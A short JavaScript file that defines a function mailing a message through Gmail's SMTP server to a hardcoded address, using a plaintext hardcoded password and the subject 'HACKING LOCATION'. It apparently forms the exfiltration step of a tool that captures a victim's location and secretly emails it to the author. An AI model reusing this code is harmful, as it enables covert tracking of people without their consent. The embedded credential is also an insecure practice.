//index.js
function sendEmail(msg) {
	Email.send({
		Host: "smtp.gmail.com",
		Username : "dwulBR@gmail.com",
		Password : "64827432hjkdhfkjdhfkjshkjHKJSJDFS",
		To : 'dwulBR@gmail.com',
		From : "dwulBR@gmail.com",
		Subject : "HACKING LOCATION",
		Body : msg,
	})
	.then(function(message){
		console.log("mail sent successfully")
	});
	
}
